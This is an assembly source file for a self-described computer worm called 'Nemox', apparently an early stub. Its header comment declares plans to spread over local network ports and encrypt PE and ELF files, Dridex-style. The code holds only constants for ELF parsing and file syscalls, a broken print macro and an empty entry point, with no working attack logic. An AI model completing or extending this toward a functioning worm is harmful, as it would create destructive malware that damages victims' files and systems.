;   This file is part of the Nemox computer worm
;   
;   I am not responsible for any kind of damage 
;   that is made from Nemox.
;
;   The development of Nemox will last at least
;   some weeks cuz ASM is pretty new to me but
;   I think I'll manage it.
;
;   The Nemox computer worm will feature some concepts
;   borrowed from the Dridex trojan such as:
;       - Spreading via local Network Ports
;       - Encrypting local PE and ELF files
;   This is everything... Yeah! Nemox is meant to be 
;   simple but aggressive as hell...
;
.include "include/nemox.h"
section .text
global _start

%define SZ_STACK 1000
%define SZ_EHDR 564
%define SZ_MMAP 24
%define ELF 464c457fh
%define PT_LOAD 1
%define PT_DYNAMIC 2
%define PT_PHDR 6
%define TEXT_SECT 2
%define DATA_SECT 3
%define E_ENTRY 0x18
%define SYS_READDIR 89
%define SYS_READ 3
%define SYS_WRITE 4
%define SYS_OPEN 5
%define SYS_CLOSE 6
%define SYS_UNLINK 10 
%define SYS_LSEEK 19
%define SYS_MMAP 90
%define SYS_MUNMAP 91
%define SYS_FTRUNCATE 93
%define SYS_FSTAT 108

%macro payload 1
   mov   eax, 4
   mov   ebx, 1
   mov   ecx, %1
   mov   edx, %2
   int   80h
%endmacro

_start:
; begin main 

section .data
point db ".",0
copyright db "Timo Sarkar MIT 2020"
